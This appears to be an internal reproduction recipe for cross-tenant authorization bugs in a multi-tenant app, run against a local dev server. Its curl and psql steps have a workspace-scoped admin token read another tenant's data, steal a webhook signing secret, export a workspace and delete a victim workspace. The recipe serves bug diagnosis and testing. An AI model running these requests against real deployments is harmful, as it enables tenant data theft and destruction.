# admin-scope-classes — behavioural re-derivation recipe (2026-08-20)

Baseline: origin/main `a07a0baa138d628987706e94a31329379410f23a`. Host: local dev
API on `http://localhost:4000`, dev DB `barkpark_dev`.

## Setup (mints the two probe principals)

    # asc_seed.exs (mix run --no-start, MIX_ENV=dev)
    {:ok,_}=Application.ensure_all_started(:ecto_sql); {:ok,_}=Barkpark.Repo.start_link()
    {:ok, ws}   = Barkpark.Tenancy.create_workspace(%{name: "ASC Tenant", slug: "asc-tenant-N"})
    {:ok, proj} = Barkpark.Tenancy.create_project(ws, %{name: "P", slug: "asc-proj-N"})
    {:ok, t1}   = Barkpark.Auth.create_token("TOK_WS",  "asc-ws-admin",  "production", ["admin"], ws.id)
    {:ok, t2}   = Barkpark.Auth.create_token("TOK_DEF", "asc-def-admin", "production", ["admin"], nil)

`create_token/5` also inserts a `workspace_memberships` row, so TOK_WS is a member
of `asc-tenant-N` ONLY — never of `default`. Verify:

    psql -U postgres -h localhost -d barkpark_dev -Atc \
      "select w.slug from workspace_memberships m join workspaces w on w.id=m.workspace_id \
       join api_tokens t on t.id=m.principal_id where t.label='asc-ws-admin';"
    # => asc-tenant-N        (one row, never 'default')

## The decisive contrast (one token, one resource, two doors)

    curl -s -w ' %{http_code}\n' -H "Authorization: Bearer TOK_WS" \
      http://localhost:4000/w/default/p/default/v1/schemas/production   # => 403 forbidden
    curl -s -H "Authorization: Bearer TOK_WS" \
      http://localhost:4000/v1/schemas/production | python3 -c \
      "import json,sys;print(len(json.load(sys.stdin)['schemas']))"     # => 52 (Default's)

## Class A — flat dataset routes (structure / schemas / webhooks / fleet-support)

    curl -H "Authorization: Bearer TOK_WS"  .../v1/schemas/production   > a.json
    curl -H "Authorization: Bearer TOK_DEF" .../v1/schemas/production   > b.json
    md5 -q a.json b.json     # identical => the ws token is reading Default
    # same for /v1/structure/production
    curl -X POST -H "Authorization: Bearer TOK_DEF" -d '{"name":"h","url":"https://example.invalid/x","events":["create"]}' .../v1/webhooks/production
    curl -H "Authorization: Bearer TOK_WS" .../v1/webhooks/production   # foreign hook visible
    curl -X POST -H "Authorization: Bearer TOK_WS" .../v1/webhooks/production/<id>/rotate  # returns whsec_… (foreign SIGNING SECRET)
    curl -X DELETE -H "Authorization: Bearer TOK_WS" .../v1/webhooks/production/<id>       # 200, row gone
    curl -X POST -H "Authorization: Bearer TOK_WS" -d '{"name":"ascProbeType","fields":[]}' .../v1/schemas/production
    psql … "select coalesce(w.slug,'NULL') from schema_definitions s left join workspaces w on w.id=s.workspace_id where s.name='ascProbeType';"  # => default

    # fleet-support mint (Class A member #4)
    curl -X POST -H "Authorization: Bearer TOK_WS" -d '{"name":"ascprobe"}' .../v1/fleet/support-tokens
    psql … "select w.slug, t.permissions from api_tokens t join workspaces w on w.id=t.workspace_id where t.label='fleet-support-ascprobe';"  # => default | {read,write}

## Class B — genuinely global (secrets / status): derivation would REGRESS them

    curl -X PUT -H "Authorization: Bearer TOK_WS" -d '{"value":"v"}' .../v1/secrets/ASC_PROBE
    psql … "select coalesce(workspace_id::text,'NULL') from secrets where name='ASC_PROBE';"  # => NULL (global tier)
    psql … "select column_name from information_schema.columns where table_name='status_incidents';"  # no workspace_id at all

## Class C — no derivation fix reaches these

    curl -o exp.tar -w '%{http_code} %{size_download}\n' -H "Authorization: Bearer TOK_WS" \
      http://localhost:4000/api/workspaces/default/export    # 200, ~410 MB, tables/*.copy
    curl -X DELETE -H "Authorization: Bearer TOK_WS" http://localhost:4000/api/workspaces/<victim-slug>
      # 200 {"deleted":true} — victim workspace gone, attacker never a member
    curl -X PUT -H "Authorization: Bearer TOK_WS" --data-binary 'x' \
      http://localhost:4000/api/workspaces/default/media/blob/asc-probe.txt   # 200; lands in api/uploads/ (shared root)

## Test-suite traps this recipe exposes

    mix test test/barkpark_web/controllers/schema_controller_test.exs \
             test/barkpark_web/controllers/webhook_controller_test.exs \
             test/barkpark_web/controllers/secret_controller_test.exs
    # "18 tests, 0 failures" — but the first TWO PATHS DO NOT EXIST and mix test
    # ignores them silently when >=1 path matches. Prove it:
    mix test <the two nonexistent paths>   # "Paths given to \"mix test\" did not match any directory/file"

    mix test test/barkpark_web/sibling_controller_leak_test.exs   # 13 tests, 0 failures
    # its `describe "B13 schema (/v1/schemas)"` hits scoped(ws,proj,"/v1/schemas/…"),
    # i.e. /w/:ws/p/:proj/v1/schemas — the FLAT door is untested (see contrast above).

    mix test test/barkpark_web/controllers/workspace_controller_test.exs                 # 4 failures (Postgrex 40P01 deadlock)
    mix test test/barkpark_web/controllers/workspace_controller_test.exs --max-cases 1    # 44 tests, 0 failures  => parallelism flake, not a main regression

## Cleanup

    psql … "delete from secrets where name='ASC_PROBE'; delete from status_incidents where title='asc probe';
            delete from workspace_memberships where principal_id in (select id from api_tokens where label like 'asc-%' or label='fleet-support-ascprobe');
            delete from api_tokens where label like 'asc-%' or label='fleet-support-ascprobe';
            delete from projects where slug like 'asc-%'; delete from workspaces where slug like 'asc-%';"
    rm -f api/uploads/asc-probe.txt exp.tar
